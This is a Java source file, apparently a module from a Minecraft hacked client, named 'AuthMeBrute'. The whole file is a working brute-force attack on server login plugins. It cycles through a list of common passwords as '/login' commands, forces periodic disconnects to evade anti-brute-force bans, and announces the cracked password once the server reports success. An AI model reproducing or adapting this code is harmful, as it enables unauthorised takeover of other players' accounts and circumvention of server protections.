package ShwepSS.B17.modules.hacks;

import ShwepSS.B17.ChatUtils;
import ShwepSS.B17.modules.Category;
import ShwepSS.B17.modules.Module;
import ShwepSS.event.EventPacketRecieve;
import ShwepSS.event.EventPacketSend;
import ShwepSS.eventapi.EventManager;
import ShwepSS.eventapi.EventTarget;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.network.play.client.CPacketChatMessage;
import net.minecraft.network.play.server.SPacketChat;
import net.minecraft.util.text.TextComponentString;

public class AuthMeBrute
extends Module {
    private static int delay;
    Minecraft mc = Minecraft.getMinecraft();
    private int Delaytimer;
    private float targettingRange = 10.0f;
    public long var1 = 600L;
    private long var2 = -1L;
    private int var3;
    String kick = "\ufffd";
    public String valid = "";
    ServerData servak;

    public AuthMeBrute() {
        super("AuthMeBrute", "\u041f\u0435\u0440\u0435\u0431\u043e\u0440 \u043f\u0430\u0440\u043e\u043b\u0435\u0439", 0, Category.MISC, true);
    }

    @Override
    public void onEnable() {
        EventManager.register(this);
    }

    @Override
    public void onDisable() {
        EventManager.unregister(this);
    }

    @Override
    public void onTick() {
        Minecraft mc = Minecraft.getMinecraft();
        if (this.isEnabled() && (this.var2 + this.var1 < System.currentTimeMillis() || this.var2 == -1L)) {
            String[] array = new String[]{"/login 12345", "/login 123456", "/login 1234567", "/login 12345678", this.kick, "/login 123456789", "/login 1234567890", "/login 123321", "/login 1234", this.kick, "/login qwert", "/login qwerty", "/login " + mc.session.getUsername().toString(), "/login 54321", this.kick, "/login qwerty123", "/login 1q2w3e4", "/login 654321", "/login hacker", this.kick, "/login Hacker", "/login qazwsx", "/login 9999999", "/login login", this.kick, "/login Admin123", "/login admin", "/login 121212", "/login 151515", this.kick, "/login password", "/login pass123", "/login 1111", "/login 22222", this.kick, "/login 555555", "/login 00000", "/login 3579", "/login 24680", this.kick, "/login 11111111", "/login 123hui", "/login hui123", "/login 1234567890-=", this.kick, "/login 12344", "/login 123454321", "/login 123123", "/login parol", this.kick, "/login 343434", "/login home", "/login 156156", "/login 123455", this.kick, "/login 1432", "/login GovnoTypoe", "/login 1234qwe", "/login qwert123", this.kick, "/login qwe1234", "/login qwerty123", "/login qwertyuiop", "/login 9999", this.kick, "/login 2004", "/login 2005", "/login 2006", "/login 2007", this.kick, "/login 2008", "/login 2009", "/login 2010", "/login 1233", this.kick, "/login 666666", "/login anime", "/login Anime", "/login 7654321", this.kick, "/login 111222", "/login [123456]", "/login Hacker123", "/login 11qq22", this.kick, "/login hueta", "/login 222888", this.kick};
            if (this.var3 > array.length - 1) {
                this.var3 = 0;
            }
            String string = array[this.var3];
            mc.player.sendChatMessage(string);
            this.valid = string;
            ++this.var3;
            this.var2 = System.currentTimeMillis();
        }
    }

    @EventTarget
    public void onKick(EventPacketSend ev2) {
        CPacketChatMessage p2;
        if (ev2.packet instanceof CPacketChatMessage && (p2 = (CPacketChatMessage)ev2.packet).getMessage().contains("\ufffd")) {
            this.mc.displayGuiScreen(new GuiDisconnected(new GuiMainMenu(), "(\u041a\u0438\u043a \u0447\u0442\u043e\u0431\u044b \u043d\u0435 \u0437\u0430\u0431\u0430\u043d\u0438\u043b\u043e)", new TextComponentString("\u041f\u0440\u043e\u0434\u043e\u043b\u0436\u0430\u0435\u043c \u0431\u0440\u0443\u0442...")));
            this.mc.player.world.sendQuittingDisconnectingPacket();
            this.mc.loadWorld(null);
            ChatUtils.emessage("kick...");
        }
    }

    @EventTarget
    public void onStop(EventPacketRecieve e2) {
        SPacketChat packet;
        String message;
        if (e2.getPacket() instanceof SPacketChat && (message = (packet = (SPacketChat)e2.getPacket()).getChatComponent().getUnformattedText()).contains("\u0443\u0441\u043f\u0435\u0448\u043d\u043e")) {
            ChatUtils.message(String.valueOf(ChatUtils.ehack) + "\u0412\u0437\u043b\u043e\u043c\u0430\u043d\u043e: " + this.valid);
            this.toggle();
        }
    }
}

